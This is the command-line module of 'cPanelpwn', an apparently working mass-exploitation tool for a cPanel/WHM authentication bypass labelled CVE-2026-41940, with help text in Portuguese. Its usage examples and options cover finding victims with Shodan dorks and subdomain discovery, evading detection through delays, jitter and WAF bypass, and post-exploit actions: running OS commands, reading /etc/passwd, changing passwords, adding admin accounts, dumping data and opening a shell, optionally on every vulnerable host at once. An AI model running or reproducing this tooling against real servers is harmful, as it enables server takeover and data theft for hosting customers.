"""cPanelpwn module: cli."""

import os, sys, re, signal, time, argparse, threading
from typing import List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from . import config as cfg
from . import core
from . import discovery
from . import parsers
from . import cve_feed
from . import scanner
from . import report
from . import actions
from . import store
import json
from datetime import datetime
from .config import C, VERSION, banner, log
from .core import ScanCtx, parse_target
from .discovery import discover_subdomains, load_wordlist
from .parsers import is_excluded, load_exclude, load_list_file
from .cve_feed import print_cve_feed
from .scanner import check_target, scan
from .report import print_summary, save_output
from .actions import run_action
from .store import CTX_MAP, Progress, STORE, Checkpoint, DEFAULT_CHECKPOINT

# ══════════════════════════════════════════════════════════════
#  EARLY ARG VALIDATION
# ══════════════════════════════════════════════════════════════
def validate_args(args, p):
    """Falha cedo antes de escanear se faltan args companheiros obrigatórios."""
    errs = []
    a = args.action

    if getattr(args, "check", False) and a:
        errs.append("--check e --action são mutuamente exclusivos")

    if getattr(args, "session", None) and not getattr(args, "token_reuse", None):
        errs.append("--session exige --token")
    if getattr(args, "token_reuse", None) and not getattr(args, "session", None):
        errs.append("--token exige --session")
    if (getattr(args, "session", None)
            and len(getattr(args, "target_list", [])) > 1):
        errs.append("--session/--token só funcionam com alvo único (-u)")

    if a == "passwd" and not args.passwd:
        errs.append("--action passwd exige --passwd <password>")
    if a == "adduser" and not (getattr(args, "new_user", None)
                               and getattr(args, "new_domain", None)):
        errs.append("--action adduser exige --new-user e --new-domain")
    if a == "addadmin" and not (getattr(args, "new_user", None) and args.passwd):
        errs.append("--action addadmin exige --new-user e --passwd")
    if a == "readfile" and not args.read_file:
        errs.append("--action readfile exige --read-file <path>")
    if a == "shell" and len(getattr(args, "target_list", [])) > 1:
        errs.append("--action shell só funciona com alvo único (-u)")
    if getattr(args, "post_all", False) and not a:
        errs.append("--post-all exige --action")

    for e in errs:
        p.error(e)

# ══════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════
ANSI_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")

def extract_url(line: str) -> Optional[str]:
    clean = ANSI_RE.sub("", line).strip()
    m = re.search(r"(https?://[a-zA-Z0-9._:/?&=%-]+)", clean)
    if m: return m.group(1).rstrip("[].,")
    m2 = re.match(r"^(\d{1,3}(?:\.\d{1,3}){3})\s+(\d+)$", clean)
    if m2: return f"https://{m2.group(1)}:{m2.group(2)}"
    return None

def main():
    global _CHECKPOINT
    p = argparse.ArgumentParser(
        description="cPanelpwn — CVE-2026-41940 cPanel/WHM Auth Bypass",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Dorks de Shodan:
  title:"WHM Login"
  title:"WebHost Manager" port:2087
  product:"cPanel" port:2087

Exemplos:
  python3 cPanelpwn.py -u https://alvo.com:2087
  python3 cPanelpwn.py -u https://alvo.com:2087 --check
  python3 cPanelpwn.py -u https://alvo.com:2087 --session <ck> --token /cpsess1234567890 --action list
  python3 cPanelpwn.py --domain alvo.com -t 20 -q -o resultados.html
  python3 cPanelpwn.py --domain alvo.com --max-targets 50 --action list --post-all
  python3 cPanelpwn.py -u https://alvo.com:2087 --action list
  python3 cPanelpwn.py -u https://alvo.com:2087 --action dump
  python3 cPanelpwn.py -u https://alvo.com:2087 --action passwd --passwd P@ss2026!
  python3 cPanelpwn.py -u https://alvo.com:2087 --action cmd --cmd "id;whoami"
  python3 cPanelpwn.py -u https://alvo.com:2087 --action readfile --read-file /etc/passwd
  python3 cPanelpwn.py -u https://alvo.com:2087 --action addadmin --new-user hax --passwd S3cr3t!
  python3 cPanelpwn.py -u https://alvo.com:2087 --proxy http://127.0.0.1:8080
  python3 cPanelpwn.py -u https://alvo.com:2087 --delay 0.5 --jitter 0.3
  python3 cPanelpwn.py -u https://alvo.com:2087 --user-agent "curl/8.0" --no-banner
  python3 cPanelpwn.py --domain alvo.com --wordlist my-prefixes.txt -t 20
  python3 cPanelpwn.py -u https://alvo.com:2087 --no-research
  python3 cPanelpwn.py -l alvos.txt -t 20 -o resultados.json -q
  python3 cPanelpwn.py -l nmap.xml -t 20 -o resultados.html
  python3 cPanelpwn.py -l masscan.json --exclude skip.txt -o resultados.csv
  python3 cPanelpwn.py -l alvos.txt --action list --post-all
  cat urls.txt | python3 cPanelpwn.py -q
  subfinder -d alvo.com | httpx -p 2087 -silent | python3 cPanelpwn.py
  shodan search --fields ip_str,port 'title:"WHM Login"' | \\
    awk '{print "https://"$1":"$2}' | python3 cPanelpwn.py -t 30 -q
        """
    )

    tg = p.add_argument_group("Alvo")
    tg.add_argument("-u", "--url",
                    help="URL do alvo único (ex.: https://host:2087)")
    tg.add_argument("-l", "--list",
                    help="Arquivo com alvos — detecta automaticamente nmap XML, "
                         "masscan JSON, Shodan NDJSON ou texto plano")
    tg.add_argument("--domain",
                    help="Domínio raiz para descobrir subdomínios (ex.: alvo.com)\n"
                         "Fontes: logs CT de crt.sh + brute-force DNS → probe de porta WHM")
    tg.add_argument("--wordlist",
                    help="Wordlist DNS customizada para brute de --domain (um prefixo por linha)")
    tg.add_argument("--hostname",
                    help="Sobrescrever header Host canónico (detectado automaticamente)")
    tg.add_argument("--session",
                    help="Reutilizar cookie whostmgrsession existente (omite estágios 0-3)")
    tg.add_argument("--token",  dest="token_reuse",
                    help="Reutilizar token /cpsessXXXXXXXXXX existente (exige --session)")
    tg.add_argument("--exclude",
                    help="Arquivo de hosts/URLs a ignorar (um por linha)")
    tg.add_argument("--max-targets",  type=int, default=0,
                    help="Limite de segurança de alvos após --domain (0 = ilimitado)")

    sg = p.add_argument_group("Scan")
    sg.add_argument("-t", "--threads",      type=int, default=10,
                    help="Threads concorrentes para escanear (padrão: 10)")
    sg.add_argument("--timeout",            type=int, default=15,
                    help="Timeout por request na cadeia de exploit em segundos (padrão: 15)")
    sg.add_argument("--timeout-probe",      type=int, default=5,
                    help="Timeout da fase de discovery/probe WAF em segundos (padrão: 5)")
    sg.add_argument("--retries",            type=int, default=2,
                    help="Tentativas de rede por request ante erro transitório (padrão: 2)")
    sg.add_argument("--rate-limit",         type=float, default=0,
                    help="Segundos entre envios de alvos (padrão: 0)")
    sg.add_argument("--resume",             nargs="?", const="__default__",
                    help="Retomar um scan batch interrompido desde checkpoint "
                         "(FILE opcional, padrão ~/.cache/cpanelpwn/resume.json)")
    sg.add_argument("--no-checkpoint",      action="store_true",
                    help="Desativar a escrita do checkpoint de resume")
    sg.add_argument("--delay",              type=float, default=0,
                    help="Atraso fixo por request em segundos (stealth; padrão: 0)")
    sg.add_argument("--jitter",             type=float, default=0,
                    help="Jitter aleatório (0..N s) somado a --delay (padrão: 0)")
    sg.add_argument("--user-agent",
                    help="User-Agent customizado para todas as requests")
    sg.add_argument("--no-research",        action="store_true",
                    help="Desativar a pesquisa online de bypass WAF (privacidade/stealth)")
    sg.add_argument("--proxy",
                    help="Proxy HTTP para todas as requests (ex.: http://127.0.0.1:8080)")
    sg.add_argument("--check",              action="store_true",
                    help="Somente verificação passiva de versão — sem tentativa de exploit")

    ag = p.add_argument_group("Post-Exploit")
    ag.add_argument("--action",
                    choices=["list", "passwd", "cmd", "exec", "info",
                             "version", "shell", "adduser", "addadmin",
                             "readfile", "dump"],
                    help="Ação post-exploit a executar após um bypass exitoso")
    ag.add_argument("--post-all",        action="store_true",
                    help="Executar --action em TODOS os alvos vulneráveis após o scan batch")
    ag.add_argument("--passwd",          help="Senha (--action passwd / addadmin)")
    ag.add_argument("--cmd",             help="Comando do SO a executar (--action cmd/exec)")
    ag.add_argument("--new-user",        help="Nome de usuário (--action adduser / addadmin)")
    ag.add_argument("--new-domain",      help="Domínio (--action adduser)")
    ag.add_argument("--read-file",       help="Caminho do arquivo a ler (--action readfile)")

    og = p.add_argument_group("Saída")
    og.add_argument("-o", "--output",
                    help="Salvar resultados em arquivo (.json, .csv ou .html)")
    og.add_argument("--json-lines",     action="store_true",
                    help="Emitir cada achado como uma linha NDJSON em stdout "
                         "(pipe a jq)")
    og.add_argument("-q", "--quiet",     action="store_true",
                    help="Suprimir todos os logs excepto PWNED/CRIT/HIGH")
    og.add_argument("--no-color",        action="store_true",
                    help="Desativar cores ANSI")
    og.add_argument("--no-banner",       action="store_true",
                    help="Omitir o banner ASCII")
    og.add_argument("-V", "--version",   action="version",
                    version=f"cPanelpwn v{VERSION} — CVE-2026-41940")
    og.add_argument("--cve-feed",        action="store_true",
                    help="Forzar atualização do feed CVE (ignorar cache 24h)")
    og.add_argument("--no-cve-feed",     action="store_true",
                    help="Desativar o feed CVE no início")
    og.add_argument("--cve-days",        type=int, default=90,
                    help="Janela de dias do feed CVE (padrão: 90)")
    og.add_argument("--no-update-check", action="store_true",
                    help="Desativar a verificação de versão no GitHub")

    args = p.parse_args()

    if args.no_color:
        for attr in [x for x in dir(C) if not x.startswith("_")]:
            setattr(C, attr, "")

    cfg._RETRIES       = args.retries
    cfg._QUIET         = args.quiet
    cfg._PROXY         = args.proxy
    cfg._TIMEOUT_PROBE = args.timeout_probe
    cfg._DELAY         = args.delay
    cfg._JITTER        = args.jitter
    cfg._UA            = args.user_agent
    cfg._NO_RESEARCH   = args.no_research
    cfg._NO_BANNER     = args.no_banner
    cfg._CVE_FEED_ON   = not args.no_cve_feed
    cfg._CVE_DAYS      = max(1, args.cve_days)
    cfg._UPDATE_CHECK  = not args.no_update_check
    cfg._JSON_LINES    = args.json_lines
    banner()
    print_cve_feed(force=args.cve_feed)

    # ── Construir lista de alvos ─────────────────────────────────
    targets: List[str] = []

    if args.url:
        targets.append(args.url)

    if args.list:
        loaded = load_list_file(args.list)
        if not loaded and not os.path.exists(args.list):
            p.error(f"Arquivo não encontrado: {args.list}")
        targets += loaded

    if not sys.stdin.isatty():
        for line in sys.stdin:
            u = extract_url(line)
            if u: targets.append(u)

    # --domain: descobrir subdomínios, sondear WHM, injetar na lista de alvos
    if args.domain:
        wl = load_wordlist(args.wordlist) if args.wordlist else None
        disc = discover_subdomains(
            domain        = args.domain.lower().strip(),
            threads       = args.threads,
            timeout       = args.timeout,
            timeout_probe = cfg._TIMEOUT_PROBE,
            wordlist      = wl,
        )
        # Apply --max-targets cap to alvos encontrados only
        if args.max_targets and len(disc) > args.max_targets:
            log("WARN",
                f"--max-targets {args.max_targets}: limitando {len(disc)} "
                f"alvos encontrados")
            disc = disc[:args.max_targets]
        targets += disc

    if not targets:
        print(f"{C.RED}[ERROR]{C.RESET} Nenhum alvo fornecido. "
              f"Usa -u, -l, --domain, ou pipe via stdin.\n"
              f"  Example: python3 cPanelpwn.py -u https://host:2087\n"
              f"  Example: python3 cPanelpwn.py --domain target.com",
              file=sys.stderr)
        sys.exit(1)

    targets = list(dict.fromkeys(targets))   # deduplicar, preservar ordem

    # Filtro --exclude
    if args.exclude:
        excluded = load_exclude(args.exclude)
        before   = len(targets)
        targets  = [t for t in targets if not is_excluded(t, excluded)]
        removed  = before - len(targets)
        if removed:
            log("INFO", f"Excluídos {removed} alvo(s) da lista --exclude")

    args.target_list = targets
    validate_args(args, p)

    # ── Resume checkpoint ───────────────────────────────────────
    # Ativo para scans batch (ou --resume explícito). Ao retomar, alvos
    # já no checkpoint são pulados e seus achados restaurados.
    checkpoint = None
    if args.resume is not None or len(targets) > 1:
        cp_path = DEFAULT_CHECKPOINT if args.resume == "__default__" \
            else (args.resume or DEFAULT_CHECKPOINT)
        checkpoint = Checkpoint(cp_path, enabled=not args.no_checkpoint)
        if args.resume is not None or os.path.exists(cp_path):
            done = checkpoint.done()
            if done:
                for tgt, res in checkpoint.results().items():
                    f = res.get("finding")
                    if res.get("vuln") and f:
                        STORE.add(f)
                        try:
                            scheme, host, port = parse_target(f.get("target", tgt))
                            CTX_MAP[f.get("target", tgt)] = ScanCtx(
                                scheme, host, port,
                                f.get("canonical") or host,
                                f.get("session", ""), f.get("token", ""),
                                args.timeout, waf=f.get("waf", ""), bypass_hdrs={})
                        except Exception:
                            pass
                before = len(targets)
                targets = [t for t in targets if t not in done]
                log("INFO",
                    f"--resume: {len(done)} target(s) já escaneados, "
                    f"{len(targets)} restante(s)")
        if targets:
            checkpoint.set_targets(targets)
    cfg._CHECKPOINT = checkpoint

    # ── Modo check (passivo, sem exploit) ───────────────────────
    if args.check:
        log("INFO", f"Modo CHECK — scan passivo de versão em {len(targets)} alvo(s)")
        t0           = time.time()
        check_results = []
        if len(targets) == 1:
            check_results.append(check_target(targets[0]))
        else:
            with ThreadPoolExecutor(max_workers=args.threads) as ex:
                futs = {ex.submit(check_target, t): t for t in targets}
                for fut in as_completed(futs):
                    try:
                        check_results.append(fut.result())
                    except Exception as exc:
                        log("ERR", f"erro em check_target: {exc}")
        if args.output:
            ext = os.path.splitext(args.output)[1].lower()
            if ext in (".csv", ".html"):
                findings = []
                for r in check_results:
                    patched = r.get("patched")
                    findings.append({
                        "severity":  "HIGH" if patched is False else "INFO",
                        "title":     "cPanel & WHM version check",
                        "target":    r.get("target", ""),
                        "version":   r.get("version", ""),
                        "patched":   patched,
                        "cve":       "CVE-2026-41940",
                        "cvss":      "10.0",
                        "waf":       "",
                        "token":     "", "canonical": "", "session": "",
                        "api_url":   "",
                        "evidence":  json.dumps(r, ensure_ascii=False)[:400],
                        "timestamp": datetime.now().isoformat(),
                    })
                save_output(findings, args.output)
            else:
                os.makedirs(
                    os.path.dirname(args.output) if os.path.dirname(args.output) else ".",
                    exist_ok=True)
                with open(args.output, "w", encoding="utf-8") as fp:
                    json.dump(check_results, fp, indent=2, ensure_ascii=False)
            log("OK", f"Resultados do check → {args.output}")
        log("INFO",
            f"Check completo: {len(check_results)} alvo(s) em "
            f"{time.time()-t0:.1f}s")
        sys.exit(0)

    # ── Scan normal ──────────────────────────────────────────────
    log("INFO",
        f"Alvos: {len(targets)}  Threads: {args.threads}  "
        f"Timeout: {args.timeout}s  Probe: {cfg._TIMEOUT_PROBE}s  "
        f"Retries: {args.retries}"
        + (f"  Proxy: {cfg._PROXY}" if cfg._PROXY else "")
        + (f"  Action: {args.action}" if args.action else ""))

    t0 = time.time()

    def _on_sigint(s, f):
        if cfg._CHECKPOINT:
            try:
                cfg._CHECKPOINT.save()
                log("INFO", "Checkpoint salvo — use --resume para continuar")
            except Exception:
                pass
        print_summary(time.time() - t0, len(targets))
        sys.exit(0)

    signal.signal(signal.SIGINT, _on_sigint)

    if len(targets) == 1:
        scan(targets[0], args)
    else:
        progress = Progress(len(targets))
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = []
            for t in targets:
                futs.append(ex.submit(scan, t, args, progress))
                if args.rate_limit:
                    time.sleep(args.rate_limit)
            for _ in as_completed(futs):
                pass

        if args.post_all and args.action and CTX_MAP:
            log("API", f"--post-all: executando '{args.action}' "
                f"em {len(CTX_MAP)} alvo(s) vulnerável(es)...")
            for tgt, ctx in CTX_MAP.items():
                run_action(ctx, args)

    elapsed = time.time() - t0
    if cfg._CHECKPOINT:
        try:
            cfg._CHECKPOINT.save()
        except Exception:
            pass
    print_summary(elapsed, len(targets))
    if args.output:
        save_output(STORE.all(), args.output, elapsed=elapsed, total=len(targets))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Interrompido.{C.RESET}", file=sys.stderr)
        sys.exit(0)

